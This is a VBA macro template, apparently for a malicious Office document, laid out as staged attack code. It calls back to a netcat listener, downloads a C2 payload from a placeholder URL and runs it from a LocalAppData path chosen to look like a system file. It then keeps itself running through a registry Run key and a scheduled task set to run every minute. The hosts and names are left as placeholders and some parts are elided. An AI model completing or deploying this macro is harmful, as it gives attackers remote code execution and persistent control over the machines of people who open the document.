'Original Author: John Woodman
'Modified by: Shahrukh Iqbal Mirza
'Twitter: @johnwoodman , @shahrukhiqbal24


'Stage-1: Giving an initial callback to netcat listener

Const ip = "<ip>"  'listener_ip
Const port = "<port>" 'listener_port
...
'Stage-2: Downloading and executing c2 payload
    
    Dim FileUrl As String
     Dim objXmlHttpReq As Object
     Dim objStream As Object

     FileUrl = "<payload_serving_link>"    'file_downloading_url
     ...
     If objXmlHttpReq.Status = 200 Then
          ...
          objStream.SaveToFile Environ("LocalAppData") & "\Microsoft\Windows\<payload_name>", 2  'user_profile_file_save
          objStream.Close
     End If
...
'Persistence using registry
    ...
    xlFilePath = Environ("LocalAppData") & "\Microsoft\Windows\<payload_name>"   'running_exe

    strProgramName = Environ("LocalAppData") & "\Microsoft\Windows\<payload_name>"

    Call Shell(Environ("LocalAppData") & "\Microsoft\Windows\<payload_name>", vbNormalFocus)


    Const sKey = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\" 'reg_edit
    Dim sh As Object
    Set sh = CreateObject(Class:="WScript.Shell")
    sh.RegWrite sKey & "<registry_key>", Environ("LocalAppData") & "\Microsoft\Windows\<payload_name>", "REG_SZ"
    Set sh = Nothing

'Persistence using schtasks


    Dim command As String
    Dim wsShell As Object

    command = "schtasks /create /tn ""<task_name>"" /tr ""<absolute_path_to_payload>""  /sc minute /mo 1"
